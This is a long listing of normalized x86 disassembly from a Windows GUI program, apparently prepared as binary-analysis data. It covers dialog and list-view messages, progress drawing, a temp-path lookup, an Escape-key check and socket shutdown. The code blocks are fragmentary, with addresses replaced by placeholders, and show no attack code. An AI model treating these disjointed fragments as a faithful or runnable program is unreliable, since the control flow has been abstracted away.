push ebx
mov [ esp + 0x5c ] ebp
mov [ esp + 0x60 ] ebp
call esi
push ebp
push 0x1000
push 0x401
push ebx
call esi
lea ecx [ esp + 0x1c ]
push ecx
push edi
call [ GetClientRect@IAT ]
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
sub edx eax
movzx eax dx
sub ecx [ esp + 0x1c ]
movzx edx cx
shl eax 0x10
or eax edx
push eax
push ebp
push 0x5
push edi
call esi
push ebp
push ebp
push 0x1420
push edi
call [ PostMessageA@IAT ]
push ebp
push 0x3e8
push 0x1
push edi
call [ SetTimer@IAT ]
jmp r-xdata
push ebp
push ebp
push 0xff000000
push ebp
push 0x10
push 0xc27
push 0xfffffffa
push edi
call [ GetWindowLongA@IAT ]
push eax
call [ ImageList_LoadImageA@IAT ]
mov ecx [ esp + 0x3c ]
push eax
push ebp
push 0x1208
push ecx
call esi
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
jmp [ eax * 4 + jump_table_457520 ]
mov ecx rw-data
mov [ esp + 0x3c ] ecx
call sub_404310
mov ecx [ esp + 0x914 ]
push 0xce6
push ecx
mov [ esp + 0x914 ] 0x8
call [ GetDlgItem@IAT ]
xor edi edi
xor ebp ebp
xor ebx ebx
mov [ esp + 0x14 ] eax
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] edi
mov [ esp + 0x90c ] 0x9
cmp eax 0xc83
jg r-xdata
cmp eax esi
jne r-xdata
lea edx [ esp + 0x1c ]
push edx
and eax 0xfffeffff
push eax
push 0x1019
push edi
mov [ esp + 0x2c ] 0x1
call ebx
mov ecx [ rw-data ]
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push eax
and ecx 0xfffeffff
push ecx
push 0x101a
and edx 0xffff67ff
push edi
mov [ esp + 0x30 ] edx
call ebx
mov eax [ rw-data ]
mov eax [ rw-data ]
mov edi [ esp + 0x914 ]
or ebx 0xffffffff
cmp eax ebx
jne r-xdata
cmp eax 0xfffffffb
jne r-xdata
push 0x0
push 0x0
push 0x101f
push esi
call edi
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x920 ]
mov ecx [ eax + 0x4 ]
cmp ecx 0xce6
je r-xdata
inc edi
jmp r-xdata
push eax
push 0x20000
push 0x1410
push esi
call ebx
push 0x1b
call ebp
test ah ah
js r-xdata
cmp [ ebx + 0x20 ] ebp
jb r-xdata
cmp [ ebx + 0x80 ] ebp
jb r-xdata
cmp ecx 0xe
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ ecx + 0x14 ]
sub eax esi
push eax
push edi
push edx
push 0x0
call sub_401150
test eax eax
jne r-xdata
mov ecx [ eax + 0x28 ]
cmp ecx 0xf
mov [ eax + 0xb0 ] ebp
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edi [ esp + 0x14 ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x1004
push edi
call esi
dec eax
push eax
push 0x1013
push edi
call esi
jmp r-xdata
mov edx [ esp + 0x3c ]
lea ecx [ edx + edi ]
inc eax
push eax
add ecx ebp
push ecx
lea edx [ esp + 0x50c ]
push edx
call [ lstrcpynA@IAT ]
lea esi [ esp + 0x504 ]
call sub_452590
mov al [ esp + 0x1b ]
test al al
je r-xdata
inc [ esp + 0x10 ]
inc edi
jmp r-xdata
mov [ esp + 0x1b ] 0x1
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor esi esi
nop
mov ebx [ esp + 0x920 ]
lea ecx [ esp + 0x104 ]
push ecx
mov edi 0x1
call sub_452660
add esp 0x4
lea edx [ esp + 0xb8 ]
push edx
push ebx
push 0x102d
lea ecx [ esp + 0x110 ]
push ebp
mov [ esp + 0xd0 ] 0x0
mov [ esp + 0xe0 ] 0x100
mov [ esp + 0xdc ] ecx
call esi
lea eax [ esp + 0x104 ]
push eax
lea ecx [ esp + 0xe4 ]
call sub_4024d0
lea ecx [ esp + 0xe0 ]
push ecx
lea edx [ esp + 0x50 ]
push edx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x914 ] 0x1
call sub_448ca0
cmp [ esp + 0xf8 ] 0x10
mov [ esp + 0x90c ] 0x0
jb r-xdata
push eax
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
mov edi [ esp + 0x914 ]
mov ebp [ SendDlgItemMessageA@IAT ]
lea edx [ esp + 0x504 ]
push edx
push 0x200
push 0xd
push 0xce5
push edi
call ebp
lea esi [ esp + 0x504 ]
call sub_452590
xor esi esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
push r--data
push esi
push 0x401
push 0x64
push edi
mov [ esp + 0x920 ] 0x7
call ebp
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x508 ]
push ecx
call sub_4545a0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x914 ]
push 0x0
push sub_452750
push eax
push 0xc1d
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
jmp r-xdata
mov edi [ esp + 0x914 ]
lea edx [ esp + 0x504 ]
push edx
push 0x200
push 0xd
push 0xce5
push edi
call [ SendDlgItemMessageA@IAT ]
lea esi [ esp + 0x504 ]
call sub_452590
lea eax [ esp + 0x504 ]
push eax
push 0x0
push 0x1411
push edi
call [ SendMessageA@IAT ]
jmp r-xdata
mov esi [ esp + 0x914 ]
push 0x1
push r--data
push r--data
push esi
call [ MessageBoxA@IAT ]
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
sub eax 0xc84
je r-xdata
cmp eax 0xc80
jge r-xdata
mov eax esi
or eax 0x10000
jmp r-xdata
mov eax [ esi + 0xc ]
cmp [ rw-data ] eax
jne r-xdata
push 0xce6
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov eax [ esi ]
mov esi [ esi + 0xc ]
push 0x0
push 0x0
push 0x1032
push eax
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x0
push 0x1209
push eax
call edi
test eax eax
je r-xdata
cmp ecx 0x64
jne r-xdata
lea eax [ ebx + 0xc ]
mov eax [ ebx + 0xc ]
jmp r-xdata
lea eax [ ebx + 0x6c ]
mov eax [ ebx + 0x6c ]
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax - 0x4 ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x1703
push ebp
call [ PostMessageA@IAT ]
cmp ecx 0xd
je r-xdata
mov al [ edi ]
test al al
je r-xdata
lea ecx [ esp + 0x504 ]
push ecx
push 0x0
push 0xc
push 0xce5
push ebx
call [ SendDlgItemMessageA@IAT ]
lea eax [ esp + 0x504 ]
push eax
push 0x0
push 0x1410
push ebx
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov esi [ SendMessageA@IAT ]
add eax ecx
lea edx [ eax + ebp ]
mov [ rw-data ] eax
lea eax [ esp + 0x104 ]
push eax
push 0x0
push 0x402
push ebx
mov [ rw-data ] edx
call esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ ecx + esi * 4 ]
mov eax [ edx + 0x28 ]
add eax 0xfffffffe
cmp eax 0xd
ja r-xdata
cmp esi eax
jge r-xdata
push edi
lea ecx [ esp + 0x108 ]
push ecx
lea edx [ esp + 0x70c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
lea edx [ esp + 0x104 ]
push edx
lea eax [ esp + 0x708 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
jmp r-xdata
inc ebx
cmp ebx edi
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
jl r-xdata
mov eax [ esp + 0xe4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov esi [ esp + 0x914 ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0xe
push 0xce5
push esi
call edi
mov ebp [ SendMessageA@IAT ]
push eax
call ebp
lea edx [ esp + 0x304 ]
push edx
push 0x200
push 0xd
push 0xce5
push esi
mov [ esp + 0x24 ] eax
call edi
push eax
call ebp
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x10 ]
cmp eax 0x8
mov [ esp + 0x40 ] ecx
mov ebx 0x1
jge r-xdata
push r--data
mov [ rw-data ] 0x3
push esi
lea ecx [ esp + 0x1c ]
mov [ rw-data ] 0x1
mov [ esp + 0x10 ] eax
call sub_4010c0
test eax eax
mov ebx [ SendMessageA@IAT ]
jle r-xdata
call sub_4af340
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0x1009
push 0xce6
push esi
call edi
mov ebx [ SendMessageA@IAT ]
push eax
call ebx
push 0x0
push 0xcea
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push 0x0
push 0x3000ce5
push 0x111
push esi
call ebx
jmp r-xdata
mov edi [ PeekMessageA@IAT ]
xor ebx ebx
mov esi ebp
mov edx [ esp + 0x14 ]
push 0x2
push edi
push 0x102c
push edx
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp edi eax
jge r-xdata
mov ebx [ esp + 0x914 ]
push 0xce6
push ebx
call [ GetDlgItem@IAT ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
mov ebp eax
push 0x1004
push ebp
call esi
xor edi edi
test eax eax
mov [ esp + 0x3c ] eax
jle r-xdata
dec eax
jne r-xdata
jne r-xdata
dec eax
je r-xdata
push r-xdata
push eax
push 0x1030
push edi
call ebx
push 0x0
push 0x0
push 0x1004
push edi
call ebx
mov ebp eax
xor esi esi
test ebp ebp
mov [ esp + 0x10 ] 0xffffffff
jle r-xdata
lea edx [ esp + 0x1c ]
push edx
push esi
push 0x1019
push edi
mov [ esp + 0x2c ] 0x11
call ebx
mov ecx [ esp + 0x20 ]
mov eax [ rw-data ]
or ecx 0x9800
test eax 0x10000
mov [ esp + 0x20 ] ecx
mov [ esp + 0x34 ] 0x0
je r-xdata
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
test eax eax
jl r-xdata
test [ esi + 0x14 ] 0x2
jne r-xdata
mov eax [ esp + 0x914 ]
push 0xc30
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ LoadMenuA@IAT ]
mov ebp eax
push 0x0
push ebp
call [ GetSubMenu@IAT ]
mov ecx rw-data
mov ebx eax
call sub_404310
test esi esi
jl r-xdata
push eax
call ebx
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x18 ]
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x40a
push edx
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
jge r-xdata
cmp [ ebx + 0x20 ] ebp
jb r-xdata
mov esi 0xff
push eax
call sub_458010
mov esi eax
add esp 0x4
cmp esi 0xff
jle r-xdata
cmp [ eax + 0x1 ] 0x65
jne r-xdata
cmp [ eax ] 0x74
jne r-xdata
cmp ecx 0xe
je r-xdata
lea ecx [ esp + 0x104 ]
push ecx
push 0x1
push 0x402
push ebx
call esi
lea eax [ edi + edi * 4 ]
shl eax 0x1
cdq
and edx 0xfffff
add eax edx
sar eax 0x14
cdq
mov ecx 0xa
idiv ecx
mov ecx [ esp + 0x10 ]
mov eax edi
push edx
cdq
and edx 0xfffff
add eax edx
mov edx [ esp + 0x40 ]
sar eax 0x14
push eax
mov eax [ esp + 0x1c ]
push edx
push ebp
push eax
push ecx
lea edx [ esp + 0x31c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x20
lea eax [ esp + 0x304 ]
push eax
lea ecx [ esp + 0x108 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
test ebp ebp
jne r-xdata
mov eax [ edx + 0xd4 ]
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_45754c ]
jmp [ eax * 4 + jump_table_45753c ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x708 ]
push eax
lea ecx [ esp + 0xa4 ]
call sub_401e80
lea ecx [ esp + 0x9c ]
push ecx
lea edx [ esp + 0x100 ]
push edx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x914 ] 0x2
call sub_448ca0
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
cmp [ esp + 0xb4 ] 0x10
mov [ esp + 0x4c ] ecx
mov [ esp + 0x90c ] 0x0
jb r-xdata
lea eax [ esp + 0x704 ]
mov [ esp + 0xb4 ] 0xf
mov [ esp + 0xb0 ] 0x0
mov [ esp + 0xa0 ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
push ebx
push 0xce7
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0xce8
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push 0x0
push 0x0
push 0x1004
push 0xce6
push esi
call edi
push eax
call ebp
test eax eax
jle r-xdata
mov edx eax
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x308 ]
push ecx
mov [ esp + edx + 0x44 ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov esi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0x0
push 0x1004
push 0xce6
push edi
call esi
push eax
call ebx
dec eax
push eax
push 0x1013
push 0xce6
push edi
call esi
push eax
call ebx
push r--data
mov [ rw-data ] 0x0
push 0x0
jmp r-xdata
mov ebp [ GetAsyncKeyState@IAT ]
mov eax [ esp + 0x54 ]
sub eax ebp
sar eax 0x2
xor eax eax
jmp r-xdata
inc edi
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
mov ecx [ eax + 0xb0 ]
test ecx ecx
lea esi [ eax + 0xb0 ]
je r-xdata
push 0x2
push edi
push 0x102c
push ebp
call esi
test eax eax
je r-xdata
mov ecx rw-data
mov [ esp + 0x3c ] rw-data
call sub_404310
mov edx [ rw-data ]
test edx edx
mov [ esp + 0x90c ] 0xb
jl r-xdata
cmp eax 0xc81
jne r-xdata
mov [ esp + 0x14 ] 0x1
mov esi [ esp + 0x914 ]
push 0xce6
push esi
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
mov ebp eax
push 0x1004
push ebp
call ebx
mov edi eax
test edi edi
jne r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx rw-data
mov [ rw-data ] eax
call sub_401420
jmp r-xdata
lea ecx [ esp + 0x74 ]
push ecx
push 0x0
push 0x1005
push edi
mov [ esp + 0x88 ] esi
mov [ esp + 0x84 ] 0x4
call ebx
mov edx [ rw-data ]
mov eax [ esp + 0x94 ]
mov [ edx + esi * 4 ] eax
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
mov edx [ eax + 0xfc ]
cmp edx [ rw-data ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
push esi
push 0x101a
push edi
call ebx
mov eax [ rw-data ]
mov [ esp + 0x34 ] 0x1
test [ esi + 0x18 ] 0x2
jne r-xdata
push r--data
push 0x0
push 0xc
push 0xcec
push edi
mov [ rw-data ] ebx
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
push ecx
push eax
lea eax [ esp + 0x10c ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x2c ]
mov edi [ esp + 0x38 ]
add esp 0x10
mov [ esp + 0x40 ] edx
mov [ esp + 0x50 ] edx
mov edx [ rw-data ]
push edx
mov edx [ rw-data ]
mov [ esp + 0x48 ] eax
mov [ esp + 0x58 ] eax
push edx
sub eax ecx
push eax
mov [ esp + 0x48 ] ecx
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] ecx
mov [ esp + 0x64 ] edi
call [ MulDiv@IAT ]
add eax [ esp + 0x4c ]
mov edi [ FillRect@IAT ]
mov [ esp + 0x54 ] eax
push 0xe
lea eax [ esp + 0x50 ]
push eax
push esi
call edi
mov ecx [ esp + 0x54 ]
push 0x10
lea edx [ esp + 0x40 ]
push edx
push esi
mov [ esp + 0x48 ] ecx
call edi
push 0x1
push esi
call [ SetBkMode@IAT ]
mov ebx [ esp + 0x1c ]
mov edi [ esp + 0x24 ]
mov eax 0x2
add ebx eax
sub edi eax
lea eax [ esp + 0x4c ]
push eax
mov [ esp + 0x20 ] ebx
mov [ esp + 0x28 ] edi
call [ CreateRectRgnIndirect@IAT ]
mov edi [ SelectClipRgn@IAT ]
mov ebx eax
push ebx
push esi
call edi
mov ebp [ GetSysColor@IAT ]
push 0xf
call ebp
push eax
push esi
call [ SetTextColor@IAT ]
push 0x24
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x10c ]
push edx
call [ lstrlenA@IAT ]
push eax
lea eax [ esp + 0x110 ]
push eax
push esi
call [ DrawTextA@IAT ]
push 0x0
push esi
call edi
push ebx
call [ DeleteObject@IAT ]
lea ecx [ esp + 0x3c ]
push ecx
call [ CreateRectRgnIndirect@IAT ]
mov ebx eax
push ebx
push esi
call edi
push 0x2
call ebp
push eax
push esi
call [ SetTextColor@IAT ]
push 0x24
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x10c ]
push eax
call [ lstrlenA@IAT ]
push eax
lea ecx [ esp + 0x110 ]
push ecx
push esi
call [ DrawTextA@IAT ]
push 0x0
push esi
call edi
push ebx
call [ DeleteObject@IAT ]
push 0x8
call ebp
push eax
push esi
call [ SetTextColor@IAT ]
jmp r-xdata
lea eax [ ebx + 0xc ]
mov eax [ ebx + 0xc ]
jmp r-xdata
cmp [ eax + 0x2 ] 0x78
jne r-xdata
cmp ecx 0xb
je r-xdata
lea edx [ esp + 0x304 ]
push edx
push 0x1
push 0x401
push ebx
call esi
jmp r-xdata
push 0x0
push 0x1000
push r--data
push ebp
jmp r-xdata
inc esi
jmp r-xdata
mov ecx [ ecx + esi * 4 ]
mov edx [ ecx + 0xd4 ]
push edx
call [ LocalSize@IAT ]
mov ecx [ rw-data ]
add edi eax
inc ebp
jmp r-xdata
inc [ esp + 0x14 ]
jmp r-xdata
inc [ esp + 0x10 ]
inc edi
test bl bl
mov [ esp + 0xb4 ] 0xf
mov [ esp + 0xb0 ] 0x0
mov [ esp + 0xa0 ] 0x0
je r-xdata
mov edx [ esp + 0xa0 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push ebx
push 0x1
push esi
call edi
push eax
call [ EnableWindow@IAT ]
jmp r-xdata
mov ebx 0x1
xor ebx ebx
push 0x401
push 0x64
push edi
call ebp
lea ecx [ esp + 0x1c ]
call sub_403ab0
jmp r-xdata
lea eax [ esi + eax + 0x4 ]
mov eax [ esi + eax + 0x4 ]
jmp r-xdata
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] edx
mov edi [ shutdown@IAT ]
mov ebx [ closesocket@IAT ]
mov [ esp + 0x90c ] 0xa
xor esi esi
mov ebp 0x3
jmp r-xdata
lea esp [ esp ]
cmp ebx eax
jge r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor edx edx
mov eax [ esp + 0x3c ]
inc edi
cmp edi eax
jl r-xdata
lea edx [ esp + 0x74 ]
push edx
push edi
push 0x102d
lea ecx [ esp + 0x310 ]
push ebp
mov [ esp + 0x8c ] 0x6
mov [ esp + 0x9c ] 0x200
mov [ esp + 0x98 ] ecx
call esi
lea eax [ esp + 0x304 ]
push eax
push 0x0
push 0x1411
push ebx
call esi
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp eax 0xc82
jne r-xdata
mov [ esp + 0x14 ] 0x2
jmp r-xdata
push 0x2
push edi
push 0x102c
push esi
call ebp
test eax eax
je r-xdata
xor esi esi
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] esi
mov [ esp + 0x20 ] 0x0
cmp edi esi
mov [ esp + 0x90c ] 0x6
jle r-xdata
push eax
push 0xce7
push 0x111
push esi
call ebx
push edi
push edi
push 0x1004
push ebp
call ebx
mov edi eax
mov ecx [ esp + 0x914 ]
push ecx
call [ DestroyWindow@IAT ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ eax + 0xfc ] esi
inc esi
cmp esi ebp
jl r-xdata
mov [ esp + 0x10 ] esi
test [ esi + 0x14 ] 0x2
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
mov edi [ lstrcpynA@IAT ]
lea ecx [ esi + 0x1 ]
push ecx
push eax
lea edx [ esp + 0x10c ]
push edx
call edi
cmp [ ebx + 0x20 ] ebp
jb r-xdata
cmp [ eax + 0x3 ] 0x74
je r-xdata
push 0x0
push 0x1
push 0x0
push edi
push ebp
call sub_4b1c90
add esp 0x14
mov ecx rw-data
call sub_401420
jmp r-xdata
push 0x401
push ebx
call esi
test ecx ecx
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ esp + 0x3c ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov ebp [ SendDlgItemMessageA@IAT ]
mov eax [ esp + 0x10 ]
inc eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
add esi 0x1c
call sub_4010c0
cmp [ esp + 0x10 ] eax
jl r-xdata
push eax
push 0x0
push 0x1410
push edi
call ebx
push 0x1b
call ebp
test ah ah
js r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
push 0x1
push 0x1703
push 0x1700
push eax
lea ecx [ esp + 0x2c ]
push ecx
call edi
test eax eax
jne r-xdata
inc ebx
add esi 0x4
jmp r-xdata
mov eax ebx
sub eax ebp
sar eax 0x2
xor eax eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp eax 0xc83
jne r-xdata
mov al [ rw-data ]
test al al
mov esi [ lstrcatA@IAT ]
mov [ esp + 0x14 ] 0x2
je r-xdata
xor ebx ebx
mov eax [ esp + 0x10 ]
inc edi
cmp edi eax
jl r-xdata
lea ecx [ esp + 0x74 ]
push ecx
push edi
push 0x102d
lea eax [ esp + 0x110 ]
push esi
mov [ esp + 0x8c ] 0x6
mov [ esp + 0x9c ] 0x200
mov [ esp + 0x98 ] eax
call ebp
test ebx ebx
je r-xdata
lea ecx [ esp + 0x1c ]
call sub_4480e0
jmp r-xdata
lea ecx [ ecx ]
push 0x1
push eax
push eax
push edi
mov [ rw-data ] eax
call sub_453800
add esp 0x10
jmp r-xdata
mov esi [ ecx + esi * 4 ]
cmp edi 0x1
mov edi [ EnableMenuItem@IAT ]
jne r-xdata
cmp esi eax
jge r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x39
jg r-xdata
push 0x100
add esi ebx
push esi
lea eax [ esp + 0x30c ]
push eax
call edi
lea ecx [ esp + 0x104 ]
push ecx
call [ lstrlenA@IAT ]
mov cl [ esp + eax + 0x103 ]
dec eax
cmp cl 0x30
jl r-xdata
cmp ecx 0xd
jne r-xdata
mov [ esp + 0x74 ] 0x7
mov eax 0x2
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x80 ] eax
mov [ esp + 0x84 ] eax
jmp r-xdata
mov eax [ esp + 0x20 ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor edx edx
cmp ebp edx
jne r-xdata
test ebp ebp
jne r-xdata
cmp [ ebp + edx * 4 ] ecx
je r-xdata
cmp edx eax
jge r-xdata
mov esi [ ecx + edx * 4 ]
mov eax [ esi + 0x28 ]
cmp eax 0xe
je r-xdata
cmp edx eax
jge r-xdata
mov [ esp + 0x14 ] 0x3
jmp r-xdata
lea ecx [ esp + 0x104 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
push 0x104
lea edx [ esp + 0x308 ]
push edx
lea eax [ esp + 0x10c ]
push eax
call sub_457da0
add esp 0xc
push r--data
lea ecx [ esp + 0x308 ]
push ecx
call esi
call sub_404670
push 0x104
push rw-data
lea eax [ esp + 0x30c ]
push eax
call [ lstrcpynA@IAT ]
jmp r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ rw-data ]
push 0x0
push edx
push ebx
lea eax [ esp + 0x110 ]
push eax
push ecx
call sub_4b1c90
add esp 0x14
lea edx [ esp + 0x1c ]
push edx
push edi
push 0x100e
push esi
mov [ esp + 0x2c ] 0x0
call ebp
push 0x0
lea eax [ esp + 0x20 ]
push eax
push esi
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x3c ]
lea ecx [ esp + 0x4c ]
push ecx
push edi
mov edx 0x104
sub edx eax
push 0x102d
lea eax [ esp + eax + 0x310 ]
push esi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x74 ] edx
mov [ esp + 0x70 ] eax
call ebp
lea eax [ esp + 0x74 ]
push eax
push esi
push 0x102d
lea edx [ esp + 0x310 ]
push ebp
mov [ esp + 0x8c ] 0x6
mov [ esp + 0x9c ] 0x200
mov [ esp + 0x98 ] edx
call ebx
lea ecx [ esp + 0x304 ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_402010
push r--data
lea ecx [ esp + 0x20 ]
call sub_402010
inc esi
cmp esi edi
jl r-xdata
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
push 0x1
push 0xc85
push ebx
call edi
mov eax [ esi + 0x28 ]
cmp eax 0xe
je r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x5a
jg r-xdata
mov dl 0x3a
mov bl 0x30
jmp r-xdata
mov eax [ ebx + 0x48 ]
inc eax
push eax
call j_sub_4b573e#2
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
cmp [ ebx + 0x20 ] ebp
jb r-xdata
push ebx
push ebx
push 0x1004
lea eax [ esp + 0x710 ]
push ebp
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x98 ] eax
call esi
mov ecx rw-data
mov [ esp + 0x78 ] eax
mov [ esp + 0x7c ] ebx
call sub_404310
mov ecx [ esp + 0x78 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
mov ecx rw-data
mov [ esp + 0x94 ] eax
call sub_401420
lea ecx [ esp + 0x74 ]
push ecx
push ebx
push 0x1007
push ebp
call esi
push 0x100
lea edi [ esp + 0x308 ]
lea eax [ esp + 0x108 ]
call sub_452520
mov ecx [ esp + 0x7c ]
add esp 0x4
lea eax [ esp + 0xb8 ]
push eax
push ecx
push 0x102e
lea edx [ esp + 0x310 ]
push ebp
mov [ esp + 0xd0 ] 0x1
mov [ esp + 0xdc ] edx
call esi
mov ecx [ esp + 0x78 ]
mov edx [ esp + 0x920 ]
lea eax [ esp + 0xb8 ]
push eax
push ecx
push 0x102e
push ebp
mov [ esp + 0xd0 ] 0x6
mov [ esp + 0xdc ] edx
call esi
mov edx [ rw-data ]
push 0x1
push edx
push ebx
push ebx
push 0x1004
push ebp
call esi
mov edi [ esp + 0x91c ]
dec eax
push eax
push edi
call sub_453800
add esp 0x10
push ebx
push ebx
push 0x1405
push edi
call esi
mov ebx [ GetDlgItem@IAT ]
push 0x1
push 0xcea
push edi
call ebx
mov esi [ EnableWindow@IAT ]
push eax
call esi
push 0x1
push 0x1
push edi
call ebx
push eax
call esi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x90c ] 0xffffffff
call sub_449e00
jmp r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push 0x2
push esi
push 0x102c
push edx
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp esi eax
jge r-xdata
mov eax ebx
sub eax ebp
sar eax 0x2
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp [ esi + 0x7c ] 0x4
mov [ esp + 0x10 ] 0x1
mov ebx 0x4000
mov edi 0x10
jb r-xdata
cmp eax 0xf
jne r-xdata
lea ecx [ esp + 0x304 ]
push ecx
lea ebx [ esp + 0x308 ]
call [ lstrlenA@IAT ]
mov [ esp + 0x3c ] eax
jmp r-xdata
push r--data
lea eax [ esp + 0x308 ]
push eax
call esi
lea edx [ esp + 0x304 ]
push edx
call sub_457f00
add esp 0x4
test eax eax
je r-xdata
cmp [ esp + 0x34 ] 0x10
mov eax [ esp + 0x20 ]
jae r-xdata
push 0x1
push 0xc83
push ebx
call edi
cmp eax 0xb
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
cmp eax 0xf
je r-xdata
cmp cl 0x7a
jg r-xdata
mov dl 0x5b
mov bl 0x41
jmp r-xdata
inc cl
cmp cl dl
mov [ esp + eax + 0x104 ] cl
jne r-xdata
mov [ ebp ] 0x0
mov eax [ ebx + 0xcc ]
xor edi edi
cmp eax edi
jne r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
xor ebp ebp
xor esi esi
sub edx eax
mov edi edx
sar edi 0x2
test edi edi
jbe r-xdata
mov edx [ esp + 0x24 ]
inc esi
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xac ]
add eax 0xac
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
